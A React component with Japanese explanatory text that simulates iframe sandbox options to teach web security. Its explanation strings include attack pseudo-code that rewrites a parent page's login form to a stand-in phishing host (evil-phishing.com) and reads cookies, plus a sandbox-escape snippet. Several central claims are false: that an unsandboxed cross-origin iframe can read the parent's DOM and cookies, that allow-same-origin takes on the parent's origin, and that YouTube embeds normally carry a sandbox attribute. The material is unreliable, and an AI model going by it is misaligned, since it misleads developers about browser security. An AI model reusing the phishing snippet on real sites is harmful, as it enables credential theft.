import { useState, type ChangeEvent } from 'react'

type ExplanationMode = 'friendly' | 'strict'
type SandboxOption = 'none' | 'allow-scripts' | 'allow-same-origin' | 'allow-scripts-same-origin'
type SimulationStatus = 'success' | 'warning' | 'error'

type Explanation = {
  message: string
  details: string
}

type SimulationResult = {
  status: SimulationStatus
  friendly: Explanation
  strict: Explanation
}

export function IframeSimulator() {
  const [sandbox, setSandbox] = useState<SandboxOption>('none')
  const [credentialless, setCredentialless] = useState<boolean>(false)
  const [explanationMode, setExplanationMode] = useState<ExplanationMode>('friendly')

  const handleSandboxChange = (event: ChangeEvent<HTMLSelectElement>) => {
    const { value } = event.target
    if (value === 'none' || value === 'allow-scripts' || value === 'allow-same-origin' || value === 'allow-scripts-same-origin') {
      setSandbox(value)
    }
  }

  const simulate = (): SimulationResult => {
    if (sandbox === 'none') {
      return {
        status: 'error',
        friendly: {
          message: '危険: iframe内でスクリプトが実行でき、親ページにアクセス可能',
          details:
            `sandbox 属性を付けないと、iframe は親ページと同じ権限を持ちます。攻撃者が挿入したウィジェットが document.cookie や localStorage を読み取ったり、親ページの DOM を改ざんすることが可能です。\n\nシナリオ:\n1. 広告ネットワークのウィジェットを <iframe src="https://ads.example.com/ad.html"> として読み込む。\n2. ウィジェット内で悪意のあるスクリプトが実行され、window.top.document へアクセス。\n3. 親ページに表示されているログインフォームの action を偽サイトに書き換えたり、親ページの JS にフックを仕掛けます。\n\n擬似コード:\n\`\`\`js\n// iframe 内 (攻撃者のスクリプト)\nif (window.top) {\n  const form = window.top.document.querySelector('form#login')\n  if (form) {\n    form.action = 'https://evil-phishing.com/steal'\n  }\n  console.log(window.top.document.cookie) // ✅ 取得できてしまう\n}\n\`\`\`\n\n対応策: sandbox 属性を必ず付与し、最低でも allow-scripts や allow-same-origin を慎重に付け外しします。\n\n参考リンク:\n・MDN: https://developer.mozilla.org/ja/docs/Web/HTML/Element/iframe#attr-sandbox\n・OWASP: https://owasp.org/www-community/attacks/Content_Spoofing\n・YouTube: https://www.youtube.com/watch?v=tFv1nZzG7w4`
        },
        strict: {
          message: 'セキュリティリスク: sandbox属性が未設定',
          details:
            `仕様: iframe 要素に sandbox が無い場合、ブラウザは sandboxed flag を立てずに iframe を親ドキュメントと同じ browsing context group に配置します。
https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox

ブラウザ内部:
• window.top / window.parent へのアクセスが許可され、DOM API がフルで利用可能。
• document.cookie, localStorage, IndexedDB などオリジン固有のストレージにもアクセスできます。
• allow-top-navigation 相当の権限も暗黙に付与されるため、親ページのロケーションを任意に書き換え可能。

この状態は CSP や COOP/COEP より前に評価されるため、sandbox を設定しない限り iframe 経由の攻撃面が広がります。`
        }
      }
    }

    if (sandbox === 'allow-scripts') {
      return {
        status: 'warning',
        friendly: {
          message: '制限付き: スクリプトは実行できるが、親ページへのアクセスは不可',
          details:
            `sandbox="allow-scripts" を付与すると、iframe 内で JavaScript が動きつつも「仮想的に別オリジン扱い」になります。親ページの DOM や Cookie に触れようとするとセキュリティエラーになります。

挙動:
1. iframe のスクリプトは通常どおり動作し、イベントや描画も可能。
2. ただし、window.top.document などへアクセスすると DOMException: "Blocked a frame with origin ..." が発生。
3. postMessage を使えば親子間通信は可能なので、安全にデータをやり取りしたいときは postMessage を使う。

擬似コード:
\`\`\`js
try {
  window.top.document.title = 'Hacked'
} catch (error) {
  console.error('親ページにアクセス不可', error)
}
window.parent.postMessage({ type: 'READY' }, '*')
\`\`\`

この設定はチャットウィジェットや外部アプリを埋め込む際に便利で、UI は自由に動かしつつ親ページへの直接アクセスだけを防げます。

参考リンク:
・MDN: https://developer.mozilla.org/ja/docs/Web/API/Window/postMessage
・web.dev: https://web.dev/sandboxed-iframes/`
        },
        strict: {
          message: 'サンドボックス有効: スクリプト実行のみ許可',
          details:
            `仕様: sandboxed origin browsing context flag が立った状態で scripting flag だけ解除されます。
https://html.spec.whatwg.org/multipage/origin.html#sandboxed-origin-browsing-context-flag

ブラウザ内部:
• Renderer は "opaque origin" を割り当て、document.origin は "null" になります。
• window.top / window.parent / document.cookie などオリジン境界を越えるAPIが SecurityError で失敗。
• Storage API、Service Worker 登録も不可。

postMessage や BroadcastChannel を使えば安全に通信できます。`
        }
      }
    }

    if (sandbox === 'allow-same-origin') {
      return {
        status: 'warning',
        friendly: {
          message: '制限付き: スクリプトは実行できないが、同一オリジンとして扱われる',
          details:
            `sandbox="allow-same-origin" では、iframe 内のドキュメントを親と同じオリジンとして認識させつつ、スクリプト実行は完全に禁止します。つまり、静的な HTML や画像ビューアなどを安全に表示したい場合に便利です。

利用例:
• 社内レポートを iframe で埋め込みたいが、JavaScript を無効化して改ざんを防ぎたい。
• PDF ビューアなど、DOM アクセスだけは必要だけれどスクリプトは不要なケース。

擬似コード:
\`\`\`html
<iframe sandbox="allow-same-origin" src="/reports/summary.html"></iframe>
<!-- 子フレーム内では <script> が無視されます -->
\`\`\`

スクリプトが無効なため、iframe 内でアニメーションやフォーム送信は行えません。

参考リンク:
・MDN: https://developer.mozilla.org/ja/docs/Web/HTML/Element/iframe#attr-sandbox
・W3C HTML Spec: https://html.spec.whatwg.org/multipage/origin.html#sandboxing
・YouTube: https://www.youtube.com/watch?v=tFv1nZzG7w4&t=780s`
        },
        strict: {
          message: 'サンドボックス有効: 同一オリジンのみ許可',
          details:
            `仕様: sandbox token "allow-same-origin" が付与されると、sandboxed origin flag が解除され、親と同じ origin を再利用します。ただし scripting flag は依然として無効です。
https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox

ブラウザ挙動:
• document.domain は親と同じ値になります。
• しかし script execution が禁止されるため、<script> 要素や inline event handler は評価されません。
• CSS やフォーム送信、静的コンテンツの描画は許可されます。

このモードはレポート埋め込みや static サイトのミラー表示に適します。`
        }
      }
    }

    if (sandbox === 'allow-scripts-same-origin') {
      return {
        status: 'error',
        friendly: {
          message: '危険: allow-scripts と allow-same-origin の併用は避けるべき',
          details:
            `allow-scripts と allow-same-origin を同時に指定すると、iframe 内のスクリプトは親ページと同じ origin を名乗りながら JavaScript も実行できます。攻撃者は sandbox 属性を取り外して再読み込みするだけで完全に脱出できます。

攻撃例:
\`\`\`js
// iframe 内の攻撃コード
const frameInParent = window.top.document.querySelector('iframe#widget')
frameInParent.removeAttribute('sandbox')
frameInParent.src = frameInParent.src // 再読み込みでフル権限
console.log('親Cookie', window.top.document.cookie)
\`\`\`

このように sandbox の意味が失われるため、信頼できるコンテンツ以外では禁じ手です。YouTube などの大規模サービスでも慎重に限定的に使用されています。

参考リンク:
・W3C HTML: https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox
・Google Security Blog: https://security.googleblog.com/2012/03/helping-protect-against-clickjacking.html
・YouTube Iframe API ガイド: https://developers.google.com/youtube/iframe_api_reference#security_considerations`
        },
        strict: {
          message: 'セキュリティ警告: sandbox属性がバイパス可能',
          details:
            '仕様: allow-scripts と allow-same-origin を同時に指定すると、iframe内のスクリプトがsandbox属性自体を削除できます。\nhttps://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox\n\nW3C警告: "Authors should avoid setting both values together, as it allows the embedded document to remove the sandbox attribute and then reload itself, effectively breaking out of the sandbox altogether."\n\nブラウザ挙動: sandbox flag が完全に解除され、renderer は親ページと同じ browsing context group で動作します。その結果 window.top.document へのアクセスや top.location の書き換えが許可されます。\n\n結果: サンドボックスが無効化され、完全なアクセス権限を持つことになります。'
        }
      }
    }

    return {
      status: 'error',
      friendly: {
        message: 'エラー',
        details: '想定外の設定です。'
      },
      strict: {
        message: 'エラー',
        details: '未対応のケースです。'
      }
    }
  }

  const result = simulate()
  const explanation = result[explanationMode]

  const sandboxAttribute = (() => {
    if (sandbox === 'none') return ''
    if (sandbox === 'allow-scripts') return 'sandbox="allow-scripts"'
    if (sandbox === 'allow-same-origin') return 'sandbox="allow-same-origin"'
    return 'sandbox="allow-scripts allow-same-origin"'
  })()

  const credentiallessAttribute = credentialless ? ' credentialless' : ''

  const resultClass = `result ${result.status}`
  const resultIcon = result.status === 'success' ? '✓' : result.status === 'warning' ? '⚠' : '✗'

  return (
    <div className="simulator">
      <h2>iframe 属性シミュレーター</h2>
      <p className="description">
        iframe要素のセキュリティ関連属性を学習する
      </p>

      <div className="controls">
        <div className="control-group">
          <label>
            <span>sandbox 属性</span>
            <span className="hint">iframe内の実行を制限する</span>
            <select value={sandbox} onChange={handleSandboxChange}>
              <option value="none">なし (制限なし)</option>
              <option value="allow-scripts">allow-scripts</option>
              <option value="allow-same-origin">allow-same-origin</option>
              <option value="allow-scripts-same-origin">allow-scripts allow-same-origin</option>
            </select>
          </label>
          <div className="option-description">
            {sandbox === 'none' && '制限なし。iframe内のスクリプトが親ページにアクセス可能です（危険）。'}
            {sandbox === 'allow-scripts' && 'スクリプト実行は許可しますが、別オリジンとして扱われ親ページへのアクセスは不可。'}
            {sandbox === 'allow-same-origin' && '同一オリジンとして扱いますが、スクリプトは実行されません。静的コンテンツに適しています。'}
            {sandbox === 'allow-scripts-same-origin' && '⚠️ 危険: この組み合わせはsandbox属性を無効化できてしまいます。使用しないでください。'}
          </div>
        </div>

        <div className="control-group">
          <label style={{ flexDirection: 'row', alignItems: 'center', gap: '0.5rem' }}>
            <input
              type="checkbox"
              checked={credentialless}
              onChange={(e) => setCredentialless(e.target.checked)}
            />
            <span>credentialless 属性（実験的機能）</span>
          </label>
          <span className="hint" style={{ marginTop: '-0.5rem' }}>
            Cookieや認証情報なしでコンテンツを読み込み、COEP: require-corp の要件を緩和します。Chrome実験機能。仕様ドラフト: https://wicg.github.io/credentiallessness/
          </span>
        </div>
      </div>

      <div className="visualization embedded">
        <div className="parent-container">
          <div className="parent-header">
            <div className="parent-info">
              <div className="site-name">myapp.com</div>
              <div className="site-label">親ページ</div>
            </div>
            <div className="box-section">
              <div className="section-title">iframe埋め込みコード</div>
              <code className="code-block">
                {'<iframe'}
                {sandboxAttribute && <><br/>&nbsp;&nbsp;{sandboxAttribute}</>}
                {credentiallessAttribute && <><br/>&nbsp;&nbsp;credentialless</>}
                <br/>&nbsp;&nbsp;src="https://third-party.com/widget.html"
                <br/>{'></iframe>'}
              </code>
            </div>
          </div>

          <div className="embedded-content">
            <div className="embedded-item">
              <div className="site-box target" style={{ margin: 0 }}>
                <div className="site-name">third-party.com</div>
                <div className="site-label">iframe内のコンテンツ</div>
                <div className="box-section">
                  <div className="section-title">iframe内のスクリプト</div>
                  <code className="code-block">
                    {sandbox === 'none' || sandbox === 'allow-scripts' || sandbox === 'allow-scripts-same-origin' ? (
                      <>
                        {'// JavaScript実行可能'}<br/>
                        {sandbox === 'allow-scripts-same-origin' && (
                          <>
                            {'top.document.cookie'}<br/>
                            {'// 親ページにアクセス可能'}<br/>
                          </>
                        )}
                        {sandbox === 'allow-scripts' && (
                          <>
                            {'// 別オリジン扱い'}<br/>
                            {'// 親ページへのアクセス不可'}<br/>
                          </>
                        )}
                      </>
                    ) : (
                      <>{'// スクリプト実行不可'}</>
                    )}
                  </code>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="explanation-toggle" role="group" aria-label="説明モード切り替え">
        <button
          type="button"
          className={explanationMode === 'friendly' ? 'active' : ''}
          onClick={() => setExplanationMode('friendly')}
        >
          やさしい説明
        </button>
        <button
          type="button"
          className={explanationMode === 'strict' ? 'active' : ''}
          onClick={() => setExplanationMode('strict')}
        >
          厳密な説明
        </button>
      </div>

      <div className={resultClass}>
        <div className="result-icon">{resultIcon}</div>
        <div className="result-content">
          <div className="result-message">{explanation.message}</div>
          <div className="result-details">{explanation.details}</div>
        </div>
      </div>

      <div className="info-box">
        <strong>📚 仕様書リンク</strong>
        <p>
          <a href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox" target="_blank" rel="noopener noreferrer" style={{ color: '#667eea' }}>
            HTML Standard: iframe sandbox attribute
          </a>
        </p>
        <p>
          <a href="https://developer.mozilla.org/ja/docs/Web/HTML/Element/iframe#attr-sandbox" target="_blank" rel="noopener noreferrer" style={{ color: '#667eea' }}>
            MDN: iframe sandbox 属性
          </a>
        </p>
        <p>
          <a href="https://web.dev/sandboxed-iframes/" target="_blank" rel="noopener noreferrer" style={{ color: '#667eea' }}>
            web.dev: Sandboxed iframes 解説
          </a>
        </p>
        <p>
          <a href="https://www.youtube.com/watch?v=tFv1nZzG7w4" target="_blank" rel="noopener noreferrer" style={{ color: '#667eea' }}>
            YouTube: Sandboxing Iframes - Google Chrome Developers Live
          </a>
        </p>
        <p>
          <a href="https://securityheaders.com/" target="_blank" rel="noopener noreferrer" style={{ color: '#667eea' }}>
            他の検証ツール: SecurityHeaders.com (sandbox検出)
          </a>
        </p>
      </div>

      <div className="info-box" style={{ marginTop: '1rem' }}>
        <strong>💡 sandbox属性の主なフラグ</strong>
        <p style={{ whiteSpace: 'pre-line' }}>
          {`• allow-scripts: JavaScript実行を許可
• allow-same-origin: 同一オリジンとして扱う
• allow-forms: フォーム送信を許可
• allow-popups: ポップアップを許可
• allow-top-navigation: 最上位のナビゲーションを許可

⚠️ allow-scripts と allow-same-origin の同時使用は危険です。`}
        </p>
      </div>

      <div className="faq-section">
        <h3>よくある質問 (FAQ)</h3>

        <div className="faq-item">
          <div className="faq-question">Q. sandboxを設定せずにiframeを使うのは危険ですか？</div>
          <div className="faq-answer">
            信頼できないコンテンツを埋め込む場合は危険です。sandbox属性なしでは、iframe内のスクリプトが親ページのDOM、Cookie、localStorageにアクセスできてしまいます。特に第三者のコンテンツを表示する場合は必ずsandboxを設定してください。
          </div>
        </div>

        <div className="faq-item">
          <div className="faq-question">Q. allow-scriptsだけでは何ができますか？</div>
          <div className="faq-answer">
            iframe内でJavaScriptは実行できますが、別オリジンとして扱われるため、親ページのwindow.topやdocument.cookieにはアクセスできません。iframe内で独立したアプリケーションを動かす場合に適しています。
          </div>
        </div>

        <div className="faq-item">
          <div className="faq-question">Q. YouTubeの埋め込みにはどんな設定が必要ですか？</div>
          <div className="faq-answer">
            YouTube埋め込みコードには通常<code>sandbox="allow-scripts allow-same-origin allow-presentation"</code>が含まれています。動画再生にはJavaScript実行とフルスクリーン機能が必要なためです。ただし、これは信頼できるサービス（YouTube）だからこそ許容されます。
          </div>
        </div>

        <div className="faq-item">
          <div className="faq-question">Q. sandboxを設定したら自社のコンテンツも表示されなくなりました</div>
          <div className="faq-answer">
            同一オリジンのコンテンツでもsandboxを指定すると制限されます。必要な機能に応じて<code>allow-scripts</code>や<code>allow-same-origin</code>を追加してください。ただし、両方を同時に指定すると制限が無効化されるため注意が必要です。
          </div>
        </div>
      </div>
    </div>
  )
}
